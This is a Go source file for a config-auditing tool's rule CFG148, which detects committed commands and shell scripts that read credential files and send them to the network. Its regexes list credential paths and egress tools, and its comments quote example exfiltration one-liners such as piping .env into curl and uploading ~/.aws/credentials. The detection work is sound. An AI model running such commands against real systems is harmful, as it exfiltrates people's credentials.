// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"regexp"
	"strings"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

type cfg148 struct{}

// CFG148 flags a committed command or script that reads a credential file and
// sends its contents to the network in the same place: a two-step exfiltration
// a reviewer can miss because each line is benign on its own. Only a proven
// data flow is reported (a credential read piped into an egress command, a
// credential file passed to an egress upload argument, or a variable assigned
// from a credential read and then sent in a request body), so the severity is
// error.
//
// Boundary against existing rules: CFG036 scans instruction files
// (CLAUDE.md/SKILL.md), not command sites; CFG037 covers SSH private keys and
// CFG038 an environment dump (env/printenv) to the network. CFG148 covers the
// credential-file-to-egress flow on command sites and launched scripts, which
// none of them report. SSH keys and /etc/passwd are left to CFG037 and CFG031.
var CFG148 = &cfg148{}

func init() { All = append(All, CFG148) }

func (r *cfg148) ID() string { return "CFG148" }

var (
	// exfilCredFileRe matches a credential file path. Group 1 is the file token. SSH
	// private keys (CFG037) and /etc/passwd (CFG031, world readable) are left
	// out on purpose.
	exfilCredFileRe = regexp.MustCompile(`(?i)(\.env(?:\.[\w-]+)*\b|\.aws/credentials\b|\.aws/config\b|credentials\.json\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.docker/config\.json\b|\.kube/config\b|application_default_credentials\.json\b|/etc/shadow\b)`)
	// exfilEnvTemplateRe matches a non-secret example or template env file, which is
	// safe to read and commit.
	exfilEnvTemplateRe = regexp.MustCompile(`(?i)^\.env\.(?:example|sample|samples|template|templates|dist|defaults?|schema|spec|ci)$`)
	// readToolRe matches a command that reads a file's contents, so a value or a
	// pipeline stage that names it is reading the credential file, not writing
	// or naming it.
	readToolRe = regexp.MustCompile(`(?i)\b(?:cat|head|tail|base64|base32|xxd|od|hexdump|openssl|gzip|gunzip|zcat|bzip2|strings|dd|less|more|jq|yq|awk|gawk|sed|grep|egrep|cut|tr|cp|tar)\b`)
	// egressToolRe matches a command that can carry bytes off the host.
	egressToolRe = regexp.MustCompile(`(?i)\b(?:curl|wget|nc|ncat|netcat)\b`)
	// dataFlagRe marks a curl/wget request-body or upload position (not a
	// header), where a secret-bearing variable is being sent, not used to
	// authenticate.
	dataFlagRe = regexp.MustCompile(`(?i)(?:^|\s)(?:--data(?:-binary|-raw|-urlencode)?|-d|--form|-F|--upload-file|-T|--post-data|--post-file)(?:[=\s]|$)`)
	// uploadFlagRe matches a standalone flag whose following argument is the file
	// to send: `-T path`, `--upload-file path`, `-d @path`, `--data @path`.
	uploadFlagRe = regexp.MustCompile(`(?i)^(?:-T|--upload-file|--post-file|--data(?:-binary|-raw)?|-d)$`)
	// uploadInlineFlagRe matches the long form that carries the file in the same
	// token after `=`: `--upload-file=path`, `--post-file=path`, `--data=@path`.
	uploadInlineFlagRe = regexp.MustCompile(`(?i)^(?:--upload-file|--post-file|--data(?:-binary|-raw)?)=`)
	// ncHostRe captures the host argument of an nc/ncat/netcat command before
	// its port.
	ncHostRe = regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\s+(?:-\S+\s+)*([\w.\-]+)\s+\d`)
)

func (r *cfg148) Check(t *Target) []finding.Finding {
	if t == nil {
		return nil
	}
	var findings []finding.Finding
	for _, site := range commandSites(t) {
		if file, dest, _, ok := credentialExfil(site.Command); ok {
			findings = append(findings, finding.Finding{
				RuleID:   "CFG148",
				Severity: finding.Error,
				File:     site.File,
				Line:     site.Line,
				Message:  site.Label + " reads the credential file " + file + " and sends its contents to " + dest + ". A committed config or script must never exfiltrate credentials; remove it" + userScopeNote(t),
			})
		}
	}
	for _, s := range t.LaunchedScripts {
		if s.Via != "" || s.Partial || !s.isShell() {
			continue
		}
		if file, dest, off, ok := credentialExfil(s.Content); ok {
			findings = append(findings, finding.Finding{
				RuleID:   "CFG148",
				Severity: finding.Error,
				File:     s.File,
				Line:     1 + strings.Count(s.Content[:off], "\n"),
				Message:  s.Label + " reads the credential file " + file + " and sends its contents to " + dest + ". A committed script must never exfiltrate credentials; remove it",
			})
		}
	}
	return findings
}

// stmt is one statement of a command string and the byte offset it starts at.
type stmt struct {
	text string
	off  int
}

// credentialExfil reports a proven credential-file-to-egress flow in cmd: a
// credential read piped into an egress command (A), a credential file in an
// egress upload position (B), or a variable assigned from a credential read
// and later sent in a request body (C). It returns the file, the destination
// host and the byte offset of the statement that sends it.
func credentialExfil(cmd string) (file, dest string, off int, ok bool) {
	// Variables whose value reads a credential file, with the offset of the
	// assignment so a later statement can be required to follow it.
	type secretVar struct {
		file string
		off  int
	}
	secretVars := map[string]secretVar{}
	for _, m := range assignStartRe.FindAllStringSubmatchIndex(cmd, -1) {
		name := cmd[m[2]:m[3]]
		if f, isCred := credFileRead(assignedValue(cmd, m[1])); isCred {
			secretVars[name] = secretVar{file: f, off: m[2]}
		}
	}

	for _, st := range splitStatements(cmd) {
		d, hasEgress := egressDest(st.text)
		if !hasEgress {
			continue
		}
		// A: a credential read piped into this egress.
		if f, okp := pipeReadToEgress(st.text); okp {
			return f, d, st.off, true
		}
		// B: the egress uploads the credential file directly.
		if f, oku := uploadCredFile(st.text); oku {
			return f, d, st.off, true
		}
		// C: a secret-bearing variable sent in a request body.
		if dataFlagRe.MatchString(st.text) {
			for name, sv := range secretVars {
				if sv.off < st.off && referencesVar(st.text, name) {
					return sv.file, d, st.off, true
				}
			}
		}
	}
	return "", "", 0, false
}

// credFileMatch returns the first credential file named in s that is not an
// example or template.
func credFileMatch(s string) (string, bool) {
	for _, m := range exfilCredFileRe.FindAllStringSubmatch(s, -1) {
		if tok := m[1]; !exfilEnvTemplateRe.MatchString(tok) {
			return tok, true
		}
	}
	return "", false
}

// credFileRead reports whether value reads a credential file (a read tool names
// it, or a process-substitution or input redirection pulls it in), not merely
// names it.
func credFileRead(value string) (string, bool) {
	file, ok := credFileMatch(value)
	if !ok {
		return "", false
	}
	if readToolRe.MatchString(value) || strings.Contains(value, "<") {
		return file, true
	}
	return "", false
}

// egressDest returns the first non-loopback, non-example destination an egress
// command in st points at, or ok=false if st is not an egress or reaches only
// this machine or a documentation host.
func egressDest(st string) (string, bool) {
	if !egressToolRe.MatchString(st) {
		return "", false
	}
	for _, h := range loopbackHostRe.FindAllStringSubmatch(st, -1) {
		if host := strings.ToLower(h[1]); nonLoopbackExfilHost(host) {
			return host, true
		}
	}
	if m := ncHostRe.FindStringSubmatch(st); m != nil {
		if host := strings.ToLower(m[1]); nonLoopbackExfilHost(host) {
			return host, true
		}
	}
	return "", false
}

// nonLoopbackExfilHost reports whether host is a real off-host destination, not
// this machine and not a reserved documentation name.
func nonLoopbackExfilHost(host string) bool {
	host = strings.TrimSpace(host)
	switch {
	case host == "", host == "localhost", host == "0.0.0.0", host == "::1", host == "[::1]":
		return false
	case strings.HasPrefix(host, "127."):
		return false
	case exampleHostRe.MatchString(host):
		return false
	}
	return true
}

// pipeReadToEgress reports a credential read piped into the egress command in
// st: `cat .env | curl https://x`.
func pipeReadToEgress(st string) (string, bool) {
	loc := egressToolRe.FindStringIndex(st)
	if loc == nil {
		return "", false
	}
	prefix := st[:loc[0]]
	if !strings.Contains(prefix, "|") || !readToolRe.MatchString(prefix) {
		return "", false
	}
	return credFileMatch(prefix)
}

// uploadCredFile reports a credential file passed to an egress upload or
// request-body position: `curl -F "f=@~/.aws/credentials"`, `curl
// --upload-file /long/path/.env`, `wget --post-file=.env`. It reads the
// command word by word so a long path before the flag still matches.
func uploadCredFile(st string) (string, bool) {
	tokens := strings.Fields(st)
	for i, tok := range tokens {
		clean := strings.Trim(tok, `"'`)
		// @path, name=@path, --data=@path: a file after an @ in this token.
		if at := strings.LastIndexByte(clean, '@'); at >= 0 {
			if f, ok := credFileMatch(clean[at:]); ok {
				return f, true
			}
		}
		// --upload-file=path, --post-file=path, --data=path in one token.
		if uploadInlineFlagRe.MatchString(clean) {
			if f, ok := credFileMatch(clean); ok {
				return f, true
			}
		}
		// A preceding flag whose argument is this file: `-T path`.
		if i > 0 && uploadFlagRe.MatchString(strings.Trim(tokens[i-1], `"'`)) {
			if f, ok := credFileMatch(clean); ok {
				return f, true
			}
		}
	}
	return "", false
}

// referencesVar reports whether st uses the shell variable name ($name,
// ${name}, "$name").
func referencesVar(st, name string) bool {
	re := regexp.MustCompile(`\$\{?` + regexp.QuoteMeta(name) + `\b`)
	return re.MatchString(st)
}

// splitStatements splits cmd into statements on newlines, ; and the logical
// && and ||, keeping pipelines (a single |) intact, and records each
// statement's byte offset.
func splitStatements(cmd string) []stmt {
	var out []stmt
	start := 0
	for i := 0; i < len(cmd); {
		switch {
		case cmd[i] == '\n' || cmd[i] == ';':
			out = append(out, stmt{cmd[start:i], start})
			i++
			start = i
		case i+1 < len(cmd) && (cmd[i:i+2] == "&&" || cmd[i:i+2] == "||"):
			out = append(out, stmt{cmd[start:i], start})
			i += 2
			start = i
		default:
			i++
		}
	}
	out = append(out, stmt{cmd[start:], start})
	return out
}
